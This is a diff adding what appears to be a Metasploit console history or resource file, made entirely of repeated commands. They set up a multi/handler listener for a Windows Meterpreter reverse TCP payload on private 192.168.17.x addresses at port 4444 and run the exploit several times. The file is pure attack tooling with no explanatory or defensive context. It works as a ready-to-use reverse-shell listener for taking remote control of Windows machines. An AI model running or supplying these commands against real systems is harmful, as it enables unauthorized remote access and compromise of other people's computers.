@@ -1,0 +1,24 @@
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set lhost 192.168.17.128
+set lport 4444
+exit
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set lhost 192.168.17.128
+set lport 4444
+exploit
+exit
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set lhost 192.168.17.129
+set lport 4444
+exploit
+set lhost 192.168.17.130
+set lport 4444
+exploit
+exit
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set lhost 192.168.17.128
+set lport 4444
